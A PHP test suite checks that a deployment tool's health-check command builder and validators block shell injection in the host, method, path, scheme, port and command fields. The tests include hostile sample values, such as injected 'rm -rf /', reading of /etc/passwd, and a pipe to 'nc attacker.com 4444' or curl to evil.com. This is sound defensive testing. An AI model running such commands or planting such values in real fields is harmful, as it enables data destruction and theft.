<?php

use App\Jobs\ApplicationDeploymentJob;
use App\Livewire\Project\Shared\HealthChecks;
use App\Models\Application;
use App\Models\ApplicationDeploymentQueue;
use App\Models\ApplicationSetting;
use Illuminate\Support\Facades\Validator;
use Tests\TestCase;

uses(TestCase::class);

beforeEach(function () {
    Mockery::close();
});

afterEach(function () {
    Mockery::close();
});

it('sanitizes health_check_host to prevent command injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_host' => 'localhost; id > /tmp/pwned #',
    ]);

    // Should fall back to 'localhost' because input contains shell metacharacters
    expect($result)->not->toContain('; id')
        ->and($result)->not->toContain('/tmp/pwned')
        ->and($result)->toContain('localhost');
});

it('sanitizes health_check_method to prevent command injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_method' => 'GET; curl http://evil.com #',
    ]);

    expect($result)->not->toContain('evil.com')
        ->and($result)->not->toContain('; curl');
});

it('sanitizes health_check_path to prevent command injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_path' => '/health; rm -rf / #',
    ]);

    expect($result)->not->toContain('rm -rf')
        ->and($result)->not->toContain('; rm');
});

it('sanitizes health_check_scheme to prevent command injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_scheme' => 'http; cat /etc/passwd #',
    ]);

    expect($result)->not->toContain('/etc/passwd')
        ->and($result)->not->toContain('; cat');
});

it('casts health_check_port to integer to prevent injection', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_port' => '8080; whoami',
    ]);

    // (int) cast on non-numeric after digits yields 8080
    expect($result)->not->toContain('whoami')
        ->and($result)->toContain('8080');
});

it('generates valid healthcheck command with safe inputs', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_method' => 'GET',
        'health_check_scheme' => 'http',
        'health_check_host' => 'localhost',
        'health_check_port' => '8080',
        'health_check_path' => '/health',
    ]);

    expect($result)->toContain('curl -s -X')
        ->and($result)->toContain('http://localhost:8080/health')
        ->and($result)->toContain('wget -q -O-');
});

it('uses escapeshellarg on the constructed URL', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_host' => 'my-app.local',
        'health_check_path' => '/api/health',
    ]);

    // escapeshellarg wraps in single quotes
    expect($result)->toContain("'http://my-app.local:80/api/health'");
});

it('builds the healthcheck URL with brackets for an IPv6 host', function (string $host, string $expectedUrl) {
    $result = callGenerateHealthcheckCommands([
        'health_check_host' => $host,
        'health_check_port' => '8080',
        'health_check_path' => '/health',
    ]);

    expect($result)->toContain("'{$expectedUrl}'")
        ->and($result)->not->toContain('localhost');
})->with([
    'loopback' => ['::1', 'http://[::1]:8080/health'],
    'bracketed loopback' => ['[::1]', 'http://[::1]:8080/health'],
    'global address' => ['2A01:4F8:0::1', 'http://[2a01:4f8::1]:8080/health'],
]);

it('falls back to localhost for an invalid IPv6-like healthcheck host', function (string $host) {
    $result = callGenerateHealthcheckCommands(['health_check_host' => $host]);

    expect($result)->toContain("'http://localhost:80/'");
})->with([
    'too many colons' => [':::1'],
    'shell injection in brackets' => ['[::1];id'],
    'unclosed bracket' => ['[::1'],
]);

it('keeps IPv4 and hostname healthcheck hosts unchanged', function (string $host) {
    $result = callGenerateHealthcheckCommands(['health_check_host' => $host, 'health_check_port' => '3000']);

    expect($result)->toContain("'http://{$host}:3000/'");
})->with(['localhost', '127.0.0.1', 'my-app.local']);

it('validates the health check host in the health checks form', function (string $host, bool $passes) {
    $rules = (new ReflectionMethod(HealthChecks::class, 'rules'))->invoke(new HealthChecks);

    $validator = Validator::make(['healthCheckHost' => $host], ['healthCheckHost' => $rules['healthCheckHost']]);

    expect($validator->passes())->toBe($passes);
})->with([
    'localhost' => ['localhost', true],
    'hostname' => ['my-app.local', true],
    'IPv4' => ['127.0.0.1', true],
    'IPv6 loopback' => ['::1', true],
    'bracketed IPv6 loopback' => ['[::1]', true],
    'IPv6 address' => ['2a01:4f8::1', true],
    'invalid IPv6' => [':::1', false],
    'unclosed bracket' => ['[::1', false],
    'shell metacharacters' => ['localhost; id #', false],
    'IPv6 with shell metacharacters' => ['[::1];id', false],
]);

it('validates health_check_host rejects shell metacharacters via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_host' => 'localhost; id #'],
        ['health_check_host' => $rules['health_check_host']]
    );

    expect($validator->fails())->toBeTrue();
});

it('validates health_check_method rejects invalid methods via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_method' => 'GET; curl evil.com'],
        ['health_check_method' => $rules['health_check_method']]
    );

    expect($validator->fails())->toBeTrue();
});

it('validates health_check_scheme rejects invalid schemes via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_scheme' => 'http; whoami'],
        ['health_check_scheme' => $rules['health_check_scheme']]
    );

    expect($validator->fails())->toBeTrue();
});

it('validates health_check_path rejects shell metacharacters via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_path' => '/health; rm -rf /'],
        ['health_check_path' => $rules['health_check_path']]
    );

    expect($validator->fails())->toBeTrue();
});

it('validates health_check_port rejects non-numeric values via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        ['health_check_port' => '8080; whoami'],
        ['health_check_port' => $rules['health_check_port']]
    );

    expect($validator->fails())->toBeTrue();
});

it('allows valid health check values via API rules', function () {
    $rules = sharedDataApplications();

    $validator = Validator::make(
        [
            'health_check_host' => 'my-app.localhost',
            'health_check_method' => 'GET',
            'health_check_scheme' => 'https',
            'health_check_path' => '/api/v1/health',
            'health_check_port' => 8080,
        ],
        [
            'health_check_host' => $rules['health_check_host'],
            'health_check_method' => $rules['health_check_method'],
            'health_check_scheme' => $rules['health_check_scheme'],
            'health_check_path' => $rules['health_check_path'],
            'health_check_port' => $rules['health_check_port'],
        ]
    );

    expect($validator->fails())->toBeFalse();
});

it('generates CMD healthcheck command directly', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'pg_isready -U postgres',
    ]);

    expect($result)->toBe('pg_isready -U postgres');
});

it('strips newlines from CMD healthcheck command', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => "redis-cli\nping",
    ]);

    expect($result)->not->toContain("\n")
        ->and($result)->toBe('redis-cli ping');
});

it('falls back to HTTP healthcheck when CMD type has empty command', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => '',
    ]);

    // Should fall through to HTTP path
    expect($result)->toContain('curl -s -X');
});

it('falls back to HTTP healthcheck when CMD command contains shell metacharacters', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'curl localhost; rm -rf /',
    ]);

    // Semicolons are blocked by runtime regex — falls back to HTTP healthcheck
    expect($result)->toContain('curl -s -X')
        ->and($result)->not->toContain('rm -rf');
});

it('falls back to HTTP healthcheck when CMD command contains pipe operator', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'echo test | nc attacker.com 4444',
    ]);

    expect($result)->toContain('curl -s -X')
        ->and($result)->not->toContain('nc attacker.com');
});

it('falls back to HTTP healthcheck when CMD command contains subshell', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'curl $(cat /etc/passwd)',
    ]);

    expect($result)->toContain('curl -s -X')
        ->and($result)->not->toContain('/etc/passwd');
});

it('falls back to HTTP healthcheck when CMD command exceeds 1000 characters', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => str_repeat('a', 1001),
    ]);

    // Exceeds max length — falls back to HTTP healthcheck
    expect($result)->toContain('curl -s -X');
});

it('falls back to HTTP healthcheck when CMD command contains backticks', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_type' => 'cmd',
        'health_check_command' => 'curl `cat /etc/passwd`',
    ]);

    expect($result)->toContain('curl -s -X')
        ->and($result)->not->toContain('/etc/passwd');
});

it('uses sanitized method in full_healthcheck_url display', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_method' => 'INVALID;evil',
        'health_check_host' => 'localhost',
    ]);

    // Method should be sanitized to 'GET' (default) in both command and display
    expect($result)->toContain("'GET'")
        ->and($result)->not->toContain('evil');
});

it('keeps the success-only HTTP healthcheck for an expected code below 400', function (mixed $code) {
    $result = callGenerateHealthcheckCommands([
        'health_check_port' => '3000',
        'health_check_path' => '/health',
        'health_check_return_code' => $code,
    ]);

    expect($result)->toBe("curl -s -X 'GET' -f 'http://localhost:3000/health' > /dev/null || wget -q -O- 'http://localhost:3000/health' > /dev/null || exit 1");
})->with([200, 204, 301, null, 0, '200']);

it('also passes the expected 4xx or 5xx code in the HTTP healthcheck', function (mixed $code, int $expected) {
    $result = callGenerateHealthcheckCommands([
        'health_check_port' => '3000',
        'health_check_path' => '/health',
        'health_check_return_code' => $code,
    ]);

    expect($result)->toBe(
        "curl -s -o /dev/null -w '%{http_code}' -X 'GET' 'http://localhost:3000/health' | grep -qxE '[23][0-9][0-9]|{$expected}'"
        ." || wget -S -O /dev/null 'http://localhost:3000/health' 2>&1 | grep -qE 'HTTP/[0-9.]+ (2[0-9][0-9]|{$expected})'"
        .' || exit 1'
    );
})->with([[401, 401], ['403', 403], [503, 503]]);

it('sends the healthcheck method with curl and GET with the wget fallback', function (string $method, string $curlOptions) {
    $result = callGenerateHealthcheckCommands([
        'health_check_method' => $method,
        'health_check_port' => '3000',
        'health_check_path' => '/health',
    ]);

    expect($result)->toBe("curl -s {$curlOptions} -f 'http://localhost:3000/health' > /dev/null || wget -q -O- 'http://localhost:3000/health' > /dev/null || exit 1");
})->with([
    'curl -X HEAD waits for a body, so HEAD uses -I' => ['HEAD', '-I'],
    'POST' => ['POST', "-X 'POST'"],
    'OPTIONS' => ['OPTIONS', "-X 'OPTIONS'"],
]);

it('accepts a self-signed certificate only in an HTTPS healthcheck', function (mixed $code) {
    $https = callGenerateHealthcheckCommands(['health_check_scheme' => 'https', 'health_check_return_code' => $code]);
    $http = callGenerateHealthcheckCommands(['health_check_scheme' => 'http', 'health_check_return_code' => $code]);

    expect(substr_count($https, ' -k '))->toBe(1)
        ->and(substr_count($https, ' --no-check-certificate '))->toBe(1)
        ->and($http)->not->toContain(' -k ')
        ->and($http)->not->toContain('--no-check-certificate');
})->with([200, 401]);

it('sends the method and accepts a self-signed certificate in the expected code check', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_method' => 'HEAD',
        'health_check_scheme' => 'https',
        'health_check_port' => '443',
        'health_check_path' => '/health',
        'health_check_return_code' => 401,
    ]);

    expect($result)->toBe(
        "curl -s -o /dev/null -w '%{http_code}' -I -k 'https://localhost:443/health' | grep -qxE '[23][0-9][0-9]|401'"
        ." || wget -S --no-check-certificate -O /dev/null 'https://localhost:443/health' 2>&1 | grep -qE 'HTTP/[0-9.]+ (2[0-9][0-9]|401)'"
        .' || exit 1'
    );
});

it('also requires the expected response text in the HTTP healthcheck', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_port' => '3000',
        'health_check_path' => '/health',
        'health_check_response_text' => 'OK',
    ]);

    expect($result)->toBe(
        "{ curl -s -X 'GET' -f 'http://localhost:3000/health' > /dev/null || wget -q -O- 'http://localhost:3000/health' > /dev/null; }"
        ." && { curl -s -X 'GET' 'http://localhost:3000/health' | grep -qF -- 'OK' || wget -q -O- 'http://localhost:3000/health' 2>/dev/null | grep -qF -- 'OK'; }"
        .' || exit 1'
    );
});

it('reads the body of an expected error response with wget for the response text', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_return_code' => 401,
        'health_check_response_text' => 'Unauthorized',
    ]);

    expect($result)->toContain("| grep -qF -- 'Unauthorized' || wget -q --content-on-error -O- 'http://localhost:80/' 2>/dev/null | grep -qF -- 'Unauthorized'; }")
        ->and($result)->toContain("grep -qxE '[23][0-9][0-9]|401'");
});

it('escapes the expected response text for the shell and Docker Compose', function () {
    $result = callGenerateHealthcheckCommands([
        'health_check_response_text' => "it's \$HOME; id",
    ]);

    expect($result)->toContain("grep -qF -- 'it'\\''s \$\$HOME; id'")
        ->and(preg_match('/(?<!\$)\$(?!\$)/', $result))->toBe(0);
});

it('does not check the expected response text when it cannot be checked', function (string $method, string $text) {
    $result = callGenerateHealthcheckCommands([
        'health_check_method' => $method,
        'health_check_response_text' => $text,
    ]);

    expect($result)->not->toContain('grep -qF');
})->with([
    'a HEAD response has no body' => ['HEAD', 'OK'],
    'newline' => ['GET', "OK\nid"],
    'too long' => ['GET', str_repeat('a', 256)],
]);

it('validates the health check response text via API rules', function (string $text, bool $passes) {
    $validator = Validator::make(
        ['health_check_response_text' => $text],
        ['health_check_response_text' => sharedDataApplications()['health_check_response_text']]
    );

    expect($validator->passes())->toBe($passes);
})->with([['OK', true], ["it's \$ok", true], ["OK\nid", false], [str_repeat('a', 256), false]]);

it('validates the health check return code as an HTTP status via API rules', function (mixed $code, bool $passes) {
    $validator = Validator::make(
        ['health_check_return_code' => $code],
        ['health_check_return_code' => sharedDataApplications()['health_check_return_code']]
    );

    expect($validator->passes())->toBe($passes);
})->with([[401, true], [200, true], [99, false], [600, false], ['401; id', false], [401.5, false]]);

/**
 * Helper: Invokes the private generate_healthcheck_commands() method via reflection.
 */
function callGenerateHealthcheckCommands(array $overrides = []): string
{
    $defaults = [
        'health_check_type' => 'http',
        'health_check_command' => null,
        'health_check_method' => 'GET',
        'health_check_scheme' => 'http',
        'health_check_host' => 'localhost',
        'health_check_port' => null,
        'health_check_path' => '/',
        'ports_exposes' => '80',
        'health_check_return_code' => 200,
        'health_check_response_text' => null,
    ];

    $values = array_merge($defaults, $overrides);

    $application = Mockery::mock(Application::class)->makePartial();
    $application->shouldReceive('getAttribute')->with('health_check_type')->andReturn($values['health_check_type']);
    $application->shouldReceive('getAttribute')->with('health_check_command')->andReturn($values['health_check_command']);
    $application->shouldReceive('getAttribute')->with('health_check_method')->andReturn($values['health_check_method']);
    $application->shouldReceive('getAttribute')->with('health_check_scheme')->andReturn($values['health_check_scheme']);
    $application->shouldReceive('getAttribute')->with('health_check_host')->andReturn($values['health_check_host']);
    $application->shouldReceive('getAttribute')->with('health_check_port')->andReturn($values['health_check_port']);
    $application->shouldReceive('getAttribute')->with('health_check_path')->andReturn($values['health_check_path']);
    $application->shouldReceive('getAttribute')->with('health_check_return_code')->andReturn($values['health_check_return_code']);
    $application->shouldReceive('getAttribute')->with('health_check_response_text')->andReturn($values['health_check_response_text']);
    $application->shouldReceive('getAttribute')->with('ports_exposes_array')->andReturn(explode(',', $values['ports_exposes']));
    $application->shouldReceive('getAttribute')->with('build_pack')->andReturn('nixpacks');

    $settings = Mockery::mock(ApplicationSetting::class)->makePartial();
    $settings->shouldReceive('getAttribute')->with('is_static')->andReturn(false);
    $application->shouldReceive('getAttribute')->with('settings')->andReturn($settings);

    $deploymentQueue = Mockery::mock(ApplicationDeploymentQueue::class)->makePartial();
    $deploymentQueue->shouldReceive('addLogEntry')->andReturnNull();

    $job = Mockery::mock(ApplicationDeploymentJob::class)->makePartial();

    $reflection = new ReflectionClass(ApplicationDeploymentJob::class);

    $appProp = $reflection->getProperty('application');
    $appProp->setAccessible(true);
    $appProp->setValue($job, $application);

    $queueProp = $reflection->getProperty('application_deployment_queue');
    $queueProp->setAccessible(true);
    $queueProp->setValue($job, $deploymentQueue);

    $method = $reflection->getMethod('generate_healthcheck_commands');
    $method->setAccessible(true);

    return $method->invoke($job);
}
